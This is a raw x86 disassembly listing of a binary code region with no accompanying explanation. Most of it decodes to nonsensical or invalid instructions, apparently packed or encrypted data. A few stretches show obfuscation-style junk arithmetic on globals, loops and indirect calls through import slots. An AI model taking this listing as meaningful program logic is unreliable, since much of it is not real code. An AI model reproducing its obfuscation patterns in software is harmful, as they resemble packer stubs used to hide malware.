  403196:	cmp    bl,BYTE PTR [esi+0x17452127]
  40319c:	mov    ebp,0xda265dc3
  4031a1:	out    dx,eax
  4031a2:	adc    al,BYTE PTR [ebp-0x8350a42]
  4031a8:	vxorpd xmm3,xmm0,XMMWORD PTR [esi+0x76a66a21]
  4031b0:	xchg   ebx,eax
  4031b1:	sbb    al,0x7c
  4031b3:	and    bl,bl
  4031b5:	(bad)  
  4031b6:	jge    0x4031e0
  4031b8:	jae    0x4031ba
  4031ba:	adc    al,0x3b
  4031bc:	(bad)  
  4031bd:	in     al,dx
  4031be:	lods   al,BYTE PTR ds:[esi]
  4031bf:	fadd   st,st(0)
  4031c1:	popf   
  4031c2:	jo     0x4031b3
  4031c4:	pop    esp
  4031c5:	mov    al,0x1
  4031c7:	mov    ch,0xec
  4031c9:	out    dx,al
  4031ca:	(bad)  
  4031cb:	in     al,dx
  4031cc:	mov    bh,BYTE PTR ds:0xffeead28
  4031d2:	mov    ds:0x2521516f,al
  4031d7:	pop    ss
  4031d8:	shl    DWORD PTR [eax+0x51],0x21
  4031dc:	in     eax,dx
  4031dd:	sub    dl,BYTE PTR [ecx+0x9]
  4031e0:	(bad)  
  4031e1:	xchg   edx,eax
  4031e2:	mov    WORD PTR [eax-0x10],es
  4031e5:	mov    eax,0xfd2d8dab
  4031ea:	inc    eax
  4031eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ec:	jo     0x4031af
  4031ee:	daa    
  4031ef:	test   DWORD PTR ds:0xd11e8046,0xac4af2bf
  4031f9:	mov    ecx,0x47ba3bc8
  4031fe:	sbb    bh,ch
  403200:	enter  0xe596,0x8a
  403204:	push   edx
  403205:	fisub  WORD PTR [edx+esi*4+0x6a]
  403209:	mov    dh,0x5a
  40320b:	retf   
  40320c:	fcomp  QWORD PTR [edi+0x6b]
  40320f:	dec    ebp
  403210:	(bad)  
  403211:	jl     0x4031ef
  403213:	aam    0xd7
  403215:	pop    edx
  403216:	cmp    bh,ah
  403218:	pop    ebx
  403219:	inc    BYTE PTR [eax-0x2af67ec4]
  40321f:	jg     0x4031cb
  403221:	outs   dx,BYTE PTR ds:[esi]
  403222:	mov    bl,0x2d
  403224:	test   DWORD PTR ss:[esi+0x19e8dbd4],0x547bf457
  40322f:	mov    bh,0xe2
  403231:	sahf   
  403232:	scas   eax,DWORD PTR es:[edi]
  403233:	jmp    0x9b48:0x73d73d2e
  40323a:	loopne 0x4031f7
  40323c:	(bad)  
  40323d:	repnz adc eax,0x3457a587
  403243:	aad    0x8
  403245:	sti    
  403246:	and    eax,0xafbb8fc6
  40324b:	retf   0xf2d6
  40324e:	xor    ch,BYTE PTR [edx]
  403250:	cli    
  403251:	outs   dx,DWORD PTR ds:[esi]
  403252:	xchg   ecx,eax
  403253:	(bad)  
  403254:	or     al,0x61
  403256:	jg     0x4032c3
  403258:	fsubp  st(6),st
  40325a:	pop    ds
  40325b:	or     DWORD PTR [ebp+ebx*8+0x6c],ebx
  40325f:	aad    0xbe
  403261:	pop    edx
  403262:	out    0x8a,al
  403264:	test   eax,0xc64b17d7
  403269:	adc    ecx,ebx
  40326b:	fimul  DWORD PTR [edx]
  40326d:	push   esi
  40326e:	clc    
  40326f:	pop    eax
  403270:	popf   
  403271:	(bad)  
  403272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403273:	push   edi
  403274:	jmp    FWORD PTR [eax-0x48]
  403277:	cmp    BYTE PTR [edx+0x33660000],cl
  40327d:	inc    ecx
  40327e:	and    BYTE PTR [ecx+0x3afe],bh
  403284:	and    DWORD PTR ds:0x43457b,0x434543
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43458f
  403297:	xor    ecx,DWORD PTR ds:0x4344eb
  40329d:	mov    DWORD PTR ds:0x43458f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43457f
  4032ac:	xor    DWORD PTR ds:0x434503,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43458f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4345bf
  4032c1:	mov    DWORD PTR ds:0x43458f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43458f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43460b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     al,BYTE PTR [ebp+0xbc79079]
  4032f7:	adc    BYTE PTR [esi+0x7e],bh
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x4032ca
  4032ff:	jg     0x40329d
  403301:	arpl   WORD PTR [edi+0x7f0470c8],ax
  403307:	dec    esp
  403308:	fcos   
  40330a:	inc    ebp
  40330b:	inc    ebp
  40330c:	popa   
  40330d:	jmp    FWORD PTR gs:[edi-0x28d7e9d5]
  403314:	push   eax
  403315:	out    0xcf,al
  403317:	out    0x4a,al
  403319:	inc    ebx
  40331a:	ror    esi,1
  40331c:	xchg   edi,eax
  40331d:	imul   eax,ecx,0xffffffbe
  403320:	dec    edx
  403321:	(bad)  
  403322:	aaa    
  403323:	mov    al,0x8
  403325:	lea    edx,ds:0x76dabab6
  40332b:	xchg   esp,eax
  40332c:	cmp    dl,BYTE PTR [edi]
  40332e:	sbb    ecx,DWORD PTR [edx-0x59e75648]
  403334:	inc    ebx
  403335:	pop    ds
  403336:	mov    ah,BYTE PTR [ebx+0x1e]
  403339:	inc    edx
  40333a:	add    BYTE PTR [esi+0x21],bl
  40333d:	out    0xab,eax
  40333f:	jne    0x40338e
  403341:	dec    ebp
  403342:	add    bl,bl
  403344:	push   esp
  403345:	popa   
  403346:	pop    esi
  403347:	in     eax,dx
  403348:	pop    ecx
  403349:	mov    ah,BYTE PTR [edx+0x38b2050e]
  40334f:	pop    ecx
  403350:	test   al,0xa1
  403352:	mov    ebp,0x9e38b50b
  403357:	out    0xf0,al
  403359:	sahf   
  40335a:	pop    esi
  40335b:	(bad)  
  40335c:	jg     0x4033d7
  40335e:	cmp    esp,edi
  403360:	dec    ecx
  403361:	scas   al,BYTE PTR es:[edi]
  403362:	(bad)  
  403363:	mov    edi,0x1e2279fd
  403368:	xor    eax,0xbb368912
  40336d:	imul   eax,DWORD PTR [edi+0x3c],0x33a68fae
  403374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403375:	jne    0x403315
  403377:	pop    ebx
  403378:	loope  0x4033df
  40337a:	ds sbb al,0x35
  40337d:	cmc    
  40337e:	mov    ah,0x40
  403380:	fmul   DWORD PTR [ebp+0x73]
  403383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403384:	push   ecx
  403385:	adc    ecx,DWORD PTR [ebx]
  403387:	and    bh,bl
  403389:	jmp    0x8ec4:0x4e1e6f00
  403390:	mov    esi,0x2be0d95e
  403395:	pop    edi
  403396:	jmp    0x573e0a7e
  40339b:	pop    eax
  40339c:	outs   dx,DWORD PTR ds:[esi]
  40339d:	fsubrp st(6),st
  40339f:	fstp   DWORD PTR [edx+edi*4+0x53c30293]
  4033a6:	push   esp
  4033a7:	clc    
  4033a8:	add    bl,dl
  4033aa:	pop    si
  4033ac:	mov    ds:0x82b79f0b,al
  4033b1:	cld    
  4033b2:	cmp    al,0xa5
  4033b4:	jne    0x40342c
  4033b6:	mov    bl,0x86
  4033b8:	jnp    0x403390
  4033ba:	lahf   
  4033bb:	sbb    al,0xae
  4033bd:	mov    esp,0x91f18d66
  4033c2:	or     edi,DWORD PTR [esi]
  4033c4:	js     0x4033ac
  4033c6:	cld    
  4033c7:	sbb    BYTE PTR [ebx],bh
  4033c9:	or     DWORD PTR [ebx+0x575f8703],esi
  4033cf:	mov    ah,0x24
  4033d1:	aam    0xfd
  4033d3:	mov    al,0x7b
  4033d5:	and    DWORD PTR [edx-0x2d],ebp
  4033d8:	push   esi
  4033d9:	pop    ds
  4033da:	das    
  4033db:	mov    ecx,0xaa39c6a1
  4033e0:	jge    0x40340b
  4033e2:	stc    
  4033e3:	pop    ebx
  4033e4:	mov    dh,0xe
  4033e6:	or     eax,0x6de73c7a
  4033eb:	push   edx
  4033ec:	lea    ebx,[edi]
  4033ee:	icebp  
  4033ef:	inc    ebx
  4033f0:	icebp  
  4033f1:	or     edi,DWORD PTR [esi-0x6e8c92fd]
  4033f7:	out    dx,eax
  4033f8:	sub    BYTE PTR ds:0x1b03ffc9,0x73
  4033ff:	ins    DWORD PTR es:[edi],dx
  403400:	popf   
  403401:	fdiv   QWORD PTR [ecx-0x4526fe48]
  403407:	and    DWORD PTR [ecx],0xad41ca17
  40340d:	(bad)  
  40340e:	and    esi,edi
  403410:	cmp    eax,0x9dbb77db
  403415:	adc    DWORD PTR [ecx-0x42],edx
  403418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403419:	cmc    
  40341a:	add    DWORD PTR [esi],eax
  40341c:	inc    ebx
  40341d:	push   eax
  40341e:	out    0x12,al
  403420:	jns    0x4033fe
  403422:	cmp    BYTE PTR [edx-0x7bfabfc],dl
  403428:	dec    ebp
  403429:	sub    cl,BYTE PTR [ebp-0x4b]
  40342c:	mov    edx,0xfd3118e0
  403431:	and    DWORD PTR [edi-0x51576d63],0x29d57264
  40343b:	and    esi,esi
  40343d:	mov    BYTE PTR [eax+0x457deae9],cl
  403443:	ss dec eax
  403445:	hlt    
  403446:	dec    esp
  403447:	(bad)  
  403448:	pop    ds
  403449:	out    dx,eax
  40344a:	mov    ah,0xfe
  40344c:	sub    DWORD PTR [esi-0x47],0x907a70f2
  403453:	ret    0xbf7
  403456:	rcl    BYTE PTR [ebp+eiz*8+0x54],cl
  40345a:	fnstcw WORD PTR [esi]
  40345c:	repz aam 0xd0
  40345f:	sub    al,0x76
  403461:	cmp    bh,dh
  403463:	mov    DWORD PTR [esi],ecx
  403465:	retf   
  403466:	mov    esp,0xabaedff
  40346b:	test   al,0x69
  40346d:	sahf   
  40346e:	and    ebx,DWORD PTR [ebx]
  403470:	mov    dl,0x77
  403472:	test   DWORD PTR [esi-0x4803d002],ecx
  403478:	(bad)
  40347c:	or     al,0x72
  40347e:	inc    ecx
  40347f:	xchg   ebx,eax
  403480:	adc    BYTE PTR [edi],0xae
  403483:	jbe    0x4034c0
  403485:	xor    esp,DWORD PTR [edx-0x57022955]
  40348b:	mov    edi,0xad1ef295
  403490:	cmp    al,bl
  403492:	mov    al,ds:0xf1ce5ee9
  403497:	fldenv [edx]
  403499:	xchg   esp,eax
  40349a:	xor    eax,esp
  40349c:	ins    BYTE PTR es:[edi],dx
  40349d:	cld    
  40349e:	xor    DWORD PTR [eax+0x3],esi
  4034a1:	mov    esp,0x1fe058d9
  4034a6:	mov    edi,DWORD PTR [ebx]
  4034a8:	lods   al,BYTE PTR ds:[esi]
  4034a9:	jo     0x403505
  4034ab:	mov    bh,0x92
  4034ad:	inc    edx
  4034ae:	jno    0x403451
  4034b0:	in     al,0xb1
  4034b2:	(bad)  
  4034b3:	js     0x40348e
  4034b5:	cmc    
  4034b6:	pop    ss
  4034b7:	stc    
  4034b8:	ja     0x4034e2
  4034ba:	xchg   edx,eax
  4034bb:	stos   BYTE PTR es:[edi],al
  4034bc:	xor    BYTE PTR [ebx],ah
  4034be:	daa    
  4034bf:	mov    ebp,0x9d4f3392
  4034c4:	dec    esp
  4034c5:	mov    esp,0x41466a6e
  4034ca:	mov    edx,0x628e258
  4034cf:	pushf  
  4034d0:	inc    ecx
  4034d1:	mov    edx,0xb9dc81ed
  4034d6:	cwde   
  4034d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d8:	scas   eax,DWORD PTR es:[edi]
  4034d9:	jmp    0x2cc7:0x697249b1
  4034e0:	fidivr DWORD PTR ds:0x448c4d4d
  4034e6:	jmp    0x4034b9
  4034e8:	jo     0x403565
  4034ea:	mov    bh,0x69
  4034ec:	sub    ah,dl
  4034ee:	push   ebx
  4034ef:	out    dx,al
  4034f0:	mov    al,0x46
  4034f2:	jo     0x403511
  4034f4:	pop    ebp
  4034f5:	in     eax,0x83
  4034f7:	sbb    al,0x10
  4034f9:	and    esp,DWORD PTR [ebp-0x4afd3848]
  4034ff:	inc    eax
  403500:	retf   
  403501:	scas   eax,DWORD PTR es:[edi]
  403502:	ss jno 0x4034e6
  403505:	sub    cl,BYTE PTR [edi+0x16]
  403508:	(bad)  
  403509:	push   DWORD PTR ds:0xedfcd0ff
  40350f:	fist   DWORD PTR [esi-0x56c4a2dd]
  403515:	scas   al,BYTE PTR es:[edi]
  403516:	xchg   BYTE PTR [ecx+eiz*1-0x6b6e09e2],bh
  40351d:	jp     0x4034c7
  40351f:	popa   
  403520:	dec    edx
  403521:	xor    eax,0xa0dfb1e4
  403526:	rol    BYTE PTR [esi-0x63],cl
  403529:	mov    ds:0xda3f43ea,eax
  40352e:	xchg   edx,eax
  40352f:	les    ecx,FWORD PTR [esp+eiz*2+0x35]
  403533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403534:	mov    ah,0x89
  403536:	stos   DWORD PTR es:[edi],eax
  403537:	mov    eax,ds:0xfd37f1b1
  40353c:	fimul  DWORD PTR [edi+0x18]
  40353f:	mov    ebx,0x910465c7
  403544:	fwait
  403545:	mov    ebp,0x13534ea7
  40354a:	mov    al,ds:0x538a9865
  40354f:	push   edx
  403550:	or     dh,BYTE PTR [esi-0x7bf70ca4]
  403556:	data16 aaa 
  403558:	inc    ebp
  403559:	in     al,dx
  40355a:	xor    eax,0x82dce681
  40355f:	mov    dl,0xc5
  403561:	fmul   QWORD PTR [ecx]
  403563:	std    
  403564:	cdq    
  403565:	push   0xc
  403567:	and    al,0xf8
  403569:	jge    0x40351b
  40356b:	scas   eax,DWORD PTR es:[edi]
  40356c:	pop    ds
  40356d:	out    dx,al
  40356e:	xchg   ebp,eax
  40356f:	pop    ss
  403570:	addr16 inc ecx
  403572:	nop
  403573:	or     DWORD PTR [edi],edi
  403575:	retf   
  403576:	icebp  
  403577:	test   dl,bh
  403579:	xor    esp,esi
  40357b:	push   ebx
  40357c:	or     edx,DWORD PTR [esi]
  40357e:	ss popa 
  403580:	jb     0x4035b8
  403582:	addr16 test eax,0x9c6dcf2
  403588:	push   ecx
  403589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358a:	dec    ecx
  40358b:	and    eax,0x1243285f
  403590:	mov    dh,0x70
  403592:	out    0x21,al
  403594:	pop    es
  403595:	mov    ebx,0xd8f26d2e
  40359a:	add    ecx,DWORD PTR [ecx]
  40359c:	outs   dx,DWORD PTR ds:[esi]
  40359d:	bound  ebp,QWORD PTR [ebx+0x4210148b]
  4035a3:	xchg   ecx,eax
  4035a4:	ret    
  4035a5:	iret   
  4035a6:	call   0xfa6e8780
  4035ab:	addr16 (bad) 
  4035ad:	ss push edi
  4035af:	mov    DWORD PTR [eax],ebp
  4035b1:	dec    ebx
  4035b2:	int3   
  4035b3:	imul   ebp,edx,0x4b
  4035b6:	inc    edi
  4035b7:	cmp    eax,0xf7e0c45c
  4035bc:	sub    eax,0x12929c96
  4035c1:	call   0x4f41:0x7ccddcf6
  4035c8:	mov    WORD PTR ds:0x50bc6a52,cs
  4035ce:	xchg   esi,eax
  4035cf:	(bad)  
  4035d0:	and    eax,0x4c331c0c
  4035d5:	fs cli 
  4035d7:	int    0x1f
  4035d9:	addr16 jmp 0x61917385
  4035df:	ja     0x4035e3
  4035e1:	jle    0x40361f
  4035e3:	cdq    
  4035e4:	fstp   QWORD PTR [ebx]
  4035e6:	mov    cl,0xb1
  4035e8:	in     eax,dx
  4035e9:	test   al,0xb2
  4035eb:	out    dx,al
  4035ec:	sbb    DWORD PTR [eax],eax
  4035ee:	sbb    bl,BYTE PTR [eax+0x77]
  4035f1:	js     0x403585
  4035f3:	mov    ebp,0x23597cf4
  4035f8:	out    dx,al
  4035f9:	mov    esp,0x7e3319cc
  4035fe:	stc    
  4035ff:	sbb    edx,DWORD PTR ds:0x842c9221
  403605:	push   eax
  403606:	retf   0xc6bb
  403609:	mov    ch,0x4d
  40360b:	or     al,0x2a
  40360d:	daa    
  40360e:	and    BYTE PTR [eax],0x29
  403611:	jae    0x4035b1
  403613:	ins    BYTE PTR es:[edi],dx
  403614:	in     al,0xfc
  403616:	xor    BYTE PTR [ebx],ch
  403618:	xchg   esi,eax
  403619:	xor    eax,0xdbd59545
  40361e:	pop    eax
  40361f:	mov    DWORD PTR [ecx+0x6],ecx
  403622:	pop    ss
  403623:	pop    DWORD PTR [ebx+0x1185f279]
  403629:	add    bh,BYTE PTR [edi]
  40362b:	sbb    BYTE PTR [edi-0x39],0xc0
  40362f:	jp     0x403654
  403631:	dec    edi
  403632:	mov    bh,0xea
  403634:	mov    eax,ds:0x694ffa06
  403639:	fcomp  QWORD PTR [ecx+esi*2]
  40363c:	ss out 0xe,al
  40363f:	das    
  403640:	ds sbb al,0x75
  403643:	leave  
  403644:	adc    ah,BYTE PTR [ebx+0x7]
  403647:	pushf  
  403648:	or     al,0x70
  40364a:	(bad)  
  40364b:	ror    BYTE PTR [eax-0x76],cl
  40364e:	jl     0x4035f1
  403650:	xor    eax,0x2d29e55
  403655:	mov    ch,bh
  403657:	push   cs
  403658:	lods   eax,DWORD PTR ds:[esi]
  403659:	and    eax,0x814a3b0b
  40365e:	add    bl,BYTE PTR [ebp-0x1fd3a651]
  403664:	fcom   QWORD PTR [esi-0x698eaaa5]
  40366a:	and    ch,ah
  40366c:	int    0xec
  40366e:	clc    
  40366f:	cmp    BYTE PTR [ebx-0x42],0xad
  403673:	pop    ecx
  403674:	or     eax,0xad00aec3
  403679:	mov    gs,WORD PTR [ebx+0xbb7fc1f]
  40367f:	xchg   ebp,eax
  403680:	pop    ebp
  403681:	and    al,0x9a
  403683:	les    eax,FWORD PTR [eax+ebp*2-0x2246c708]
  40368a:	lock retf 
  40368c:	or     BYTE PTR es:[edi],bl
  40368f:	sar    BYTE PTR [edi-0x2133982b],1
  403695:	mov    eax,0xf232d99d
  40369a:	cli    
  40369b:	mov    ah,0xc2
  40369d:	jmp    0xc6f79279
  4036a2:	jl     0x40366b
  4036a4:	int3   
  4036a5:	xor    BYTE PTR ds:0x7538,dl
  4036aa:	xchg   esi,eax
  4036ab:	aad    0x26
  4036ad:	rcr    DWORD PTR [edi-0x21f24dea],0x1c
  4036b4:	pop    ds
  4036b5:	jmp    0xb8c5:0x5ff348a9
  4036bc:	sbb    ch,dh
  4036be:	(bad)
  4036c2:	and    BYTE PTR [ecx-0x6c],ah
  4036c5:	icebp  
  4036c6:	or     DWORD PTR [ebx],ecx
  4036c8:	aad    0xec
  4036ca:	jne    0x403678
  4036cc:	loop   0x403749
  4036ce:	xchg   al,al
  4036d0:	mov    bl,0x8
  4036d2:	and    BYTE PTR [ebp+0x458a0aba],cl
  4036d8:	dec    DWORD PTR [ebx+0x4344eb0d]
  4036de:	add    BYTE PTR [ebx],bl
  4036e0:	or     eax,0x434607
  4036e5:	mov    DWORD PTR ds:0x4344eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434613,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4344fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4344f7,0x434607
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434577,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434587,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434587
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434587,ecx
  40373d:	cmp    DWORD PTR ds:0x434587,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434587,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4345cb,0x14
  403779:	cmp    DWORD PTR ds:0x4345cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4345cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4345cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4345cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4345cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4345cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4345cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4344e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4344e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4344e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434749
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4344e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4344e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4344e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4344e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4344e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434587,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43460b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43454f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434543
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43454b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	cmp    ebp,eax
  4038bf:	mov    ch,0x74
  4038c1:	arpl   WORD PTR [ebx],dx
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x40385e
  4038ca:	rol    eax,0xa4
  4038cd:	xlat   BYTE PTR ds:[ebx]
  4038ce:	ret    0xd6b
  4038d1:	aaa    
  4038d2:	sbb    eax,ecx
  4038d4:	test   eax,0xd02fe268
  4038d9:	or     BYTE PTR [ecx],dh
  4038db:	loop   0x40391b
  4038dd:	test   BYTE PTR [ecx+ebx*4+0x21162320],0x5b
  4038e5:	fbld   TBYTE PTR [ecx]
  4038e7:	call   0xd5a436f7
  4038ec:	aad    0x2a
  4038ee:	mov    bl,0x32
  4038f0:	cmp    al,0xa1
  4038f2:	nop
  4038f3:	dec    esp
  4038f4:	test   DWORD PTR [ebx],ebx
  4038f6:	scas   al,BYTE PTR es:[edi]
  4038f7:	out    0x91,eax
  4038f9:	jbe    0x4038ee
  4038fb:	adc    edx,eax
  4038fd:	cwde   
  4038fe:	or     ebp,DWORD PTR [edi+0x3ef7d335]
  403904:	hlt    
  403905:	mov    eax,0x43b18457
  40390a:	mov    ?,esi
  40390c:	cs repnz cld 
  40390f:	hlt    
  403910:	fldenv [eax]
  403912:	sbb    al,0xa6
  403914:	mov    dl,0xde
  403916:	add    edi,esp
  403918:	sub    esi,ecx
  40391a:	int3   
  40391b:	mov    dh,ah
  40391d:	dec    eax
  40391e:	arpl   WORD PTR [edx-0x63],di
  403921:	out    0x9,al
  403923:	fwait
  403924:	retf   
  403925:	cdq    
  403926:	repz cli 
  403928:	or     eax,0xf0f58e4c
  40392d:	leave  
  40392e:	sub    BYTE PTR [edi+0x3],ah
  403931:	jle    0x4038d2
  403933:	adc    edi,esi
  403935:	pusha  
  403936:	push   ds
  403937:	push   esi
  403938:	ret    0x2e2c
  40393b:	fnstenv [eax-0x3b]
  40393e:	push   ss
  40393f:	(bad)  
  403940:	out    0x28,al
  403942:	test   eax,0xc7591f08
  403947:	fld    TBYTE PTR [ecx-0x1ca94e62]
  40394d:	scas   al,BYTE PTR es:[edi]
  40394e:	xor    BYTE PTR [esi-0x9fae7a0],ch
  403954:	inc    esp
  403955:	jo     0x403984
  403957:	(bad)  
  403958:	loope  0x403953
  40395a:	sbb    al,0xf
  40395c:	jae    0x4038f1
  40395e:	dec    ebx
  40395f:	(bad)  
  403960:	call   FWORD PTR [ebp-0x31]
  403963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403964:	adc    eax,DWORD PTR [esi-0x7a]
  403967:	out    dx,al
  403968:	int    0xd0
  40396a:	lea    eax,[eax]
  40396c:	les    ebp,FWORD PTR [ebx]
  40396e:	xchg   DWORD PTR [ebx+0x3324a54b],edi
  403974:	int3   
  403975:	jno    0x403927
  403977:	push   ss
  403978:	or     DWORD PTR [edx+0x75],edx
  40397b:	cmc    
  40397c:	jno    0x4039be
  40397e:	add    BYTE PTR [edi-0x48],bl
  403981:	add    WORD PTR [esi+0x361fc2fa],0x51b
  40398a:	lock inc ebp
  40398c:	cmp    bl,BYTE PTR [edi-0x5e39badb]
  403992:	lea    edx,[esi-0x798942fc]
  403998:	add    bh,BYTE PTR [ecx-0x3f]
  40399b:	stos   BYTE PTR es:[edi],al
  40399c:	jge    0x4039ff
  40399e:	mov    dl,ah
  4039a0:	pop    edi
  4039a1:	repz fs retf 0x269a
  4039a6:	or     DWORD PTR [ecx-0x29],esi
  4039a9:	loope  0x403946
  4039ab:	add    al,0x34
  4039ad:	test   eax,0x750db51
  4039b2:	xchg   edi,eax
  4039b3:	and    BYTE PTR [ecx+0x28f3c52f],0x89
  4039ba:	stc    
  4039bb:	mov    cl,0x53
  4039bd:	sbb    esi,DWORD PTR [ecx+0x2d]
  4039c0:	inc    edi
  4039c1:	adc    eax,0x8baf72f8
  4039c6:	ficom  WORD PTR [eax]
  4039c8:	daa    
  4039c9:	mov    ds:0x598a6d8f,al
  4039ce:	jle    0x403a06
  4039d0:	loop   0x403975
  4039d2:	push   esi
  4039d3:	fiadd  DWORD PTR [ebx]
  4039d5:	fsubr  DWORD PTR [eax]
  4039d7:	sub    al,bh
  4039d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039da:	dec    eax
  4039db:	add    dh,BYTE PTR [edx-0x119dd2cc]
  4039e1:	pushf  
  4039e2:	jmp    0x403a4a
  4039e4:	sub    al,0xcc
  4039e6:	ret    
  4039e7:	lahf   
  4039e8:	cmp    edi,DWORD PTR [eax-0x31]
  4039eb:	call   0x87e28dc
  4039f0:	jnp    0x403a3a
  4039f2:	inc    esp
  4039f3:	add    ecx,DWORD PTR [ebx+ebx*1+0x22]
  4039f7:	jo     0x403a51
  4039f9:	mov    ecx,0xff2333f3
  4039fe:	inc    esi
  4039ff:	add    eax,0xb6126f98
  403a04:	cdq    
  403a05:	ss sub ebx,ebx
  403a08:	xor    bh,dl
  403a0a:	mov    edi,0xea0b3670
  403a0f:	jecxz  0x4039e6
  403a11:	mov    BYTE PTR [ecx-0x7],dl
  403a14:	loope  0x403a59
  403a16:	fimul  DWORD PTR es:[ebx-0x55]
  403a1a:	jno    0x4039be
  403a1c:	pop    ds
  403a1d:	add    esp,DWORD PTR [edx+ebp*8+0x12]
  403a21:	lea    ebp,[ebp-0x5b]
  403a24:	iret   
  403a25:	daa    
  403a26:	in     al,0xc6
  403a28:	es fs out 0x4d,al
  403a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2d:	rcr    ebx,0x2d
  403a30:	sahf   
  403a31:	push   esi
  403a32:	sti    
  403a33:	or     eax,0x407c25df
  403a38:	pop    ss
  403a39:	icebp  
  403a3a:	cwde   
  403a3b:	mov    al,ds:0xdd7b1024
  403a40:	fldenv [ebx+ebx*4-0x129e917c]
  403a47:	xlat   BYTE PTR ds:[ebx]
  403a48:	xor    dl,BYTE PTR [esi+eax*2]
  403a4b:	ja     0x403aa6
  403a4d:	mov    esp,0xc79b4c1a
  403a52:	mov    esi,0xde0de645
  403a57:	int3   
  403a58:	dec    edx
  403a5a:	int    0xcf
  403a5c:	push   esp
  403a5d:	(bad)  
